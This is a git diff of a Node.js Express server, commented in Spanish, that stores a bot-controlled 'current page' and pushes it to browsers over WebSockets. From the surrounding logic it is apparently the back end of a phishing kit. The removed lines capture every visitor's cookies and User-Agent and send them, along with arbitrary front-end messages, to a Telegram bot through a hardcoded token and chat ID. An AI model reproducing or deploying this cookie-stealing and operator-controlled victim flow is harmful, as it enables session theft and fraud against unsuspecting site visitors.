@@ -22,32 +22,22 @@ app.use(express.static(path.join(__dirname, "public")));
 // 🗄️ Base de datos SQLite
 const db = new Database("control.db", { verbose: console.log });
 db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY, pagina TEXT)");
-db.prepare("INSERT OR IGNORE INTO control (id, pagina) VALUES (1, 'loader')").run();  // 🔥 Asegura que loader sea el valor inicial
+db.prepare("INSERT OR IGNORE INTO control (id, pagina) VALUES (1, 'loader')").run(); // 🔥 Arranca en loader siempre
 
 // 🔌 WebSockets para actualización en tiempo real
 wss.on("connection", (ws) => {
     console.log("🔌 Cliente WebSocket conectado");
 
-    // Consultar la última página guardada en la base de datos
+    // 📌 Verificar qué página está guardada
     let row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
     let paginaActual = row ? row.pagina : "loader";
 
     console.log(`📌 Enviando página actual: ${paginaActual}`);
-    ws.send(paginaActual); // 🔥 Solo cambiará si el bot lo ordena
+    ws.send(paginaActual);
 
     ws.on("close", () => {
         console.log("🔌 Cliente WebSocket desconectado");
     });
-});
-
-// 🏠 Ruta principal
-app.get("/home.html", (req, res) => {
-    const userAgent = req.headers["user-agent"];
-    const cookies = req.cookies;
-    console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
-
-    sendTelegramMessage(`Nuevo visitante:\nUser-Agent: ${userAgent}\nCookies: ${JSON.stringify(cookies)}`);
-    res.sendFile(path.join(__dirname, "public", "home.html"));
 });
 
 // 📌 Endpoint para verificar el estado de la página
@@ -56,25 +46,12 @@ app.get("/check", (req, res) => {
     res.json({ pagina: row ? row.pagina : "loader" });
 });
 
-// 📩 Función para enviar mensajes a Telegram
-async function sendTelegramMessage(message) {
-    try {
-        const bot = { 
-            token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
-            chatId: "6328222257" 
-        };
-
-        await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-            chat_id: bot.chatId,
-            text: message,
-            parse_mode: "MarkdownV2"
-        });
-
-        console.log("✅ Mensaje enviado a Telegram");
-    } catch (error) {
-        console.error("❌ Error enviando mensaje a Telegram:", error.message);
-    }
-}
+// 📌 Forzar la base de datos a `"loader"` cuando alguien entra a loader.html
+app.get("/loader.html", (req, res) => {
+    console.log("🔄 Volviendo a loader.html, reseteando base de datos...");
+    db.prepare("UPDATE control SET pagina = 'loader' WHERE id = 1").run(); // 🔥 Siempre que se entra a loader.html, se resetea
+    res.sendFile(path.join(__dirname, "public", "loader.html"));
+});
 
 // ⚡ Endpoint para cambiar la página (usado por el bot)
 app.post("/setPage", (req, res) => {
@@ -89,6 +66,13 @@ app.post("/setPage", (req, res) => {
         return res.json({ message: "No se puede cambiar a 'loader' desde aquí" });
     }
 
+    // ✅ Solo cambiar si es diferente a la actual
+    let row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
+    if (row && row.pagina === pagina) {
+        console.log(`ℹ️ Página ya estaba en '${pagina}', no se actualiza.`);
+        return res.json({ message: "Página ya estaba en ese estado" });
+    }
+
     db.prepare("UPDATE control SET pagina = ? WHERE id = 1").run(pagina);
     console.log(`✅ Página cambiada a: ${pagina}`);
 
@@ -99,23 +83,6 @@ app.post("/setPage", (req, res) => {
     });
 
     res.json({ message: "Página actualizada correctamente" });
-});
-
-// 📩 Endpoint para enviar mensajes a Telegram desde el frontend
-app.post("/enviar-telegram", async (req, res) => {
-    try {
-        const { mensaje } = req.body;
-        if (!mensaje) {
-            return res.status(400).json({ error: "Falta el mensaje" });
-        }
-
-        await sendTelegramMessage(mensaje);
-        res.json({ success: true, message: "Mensaje enviado correctamente a Telegram" });
-
-    } catch (error) {
-        console.error("❌ Error al enviar mensaje a Telegram:", error.message);
-        res.status(500).json({ error: "Error al enviar mensaje a Telegram" });
-    }
 });
 
 // 🚀 Iniciar servidor
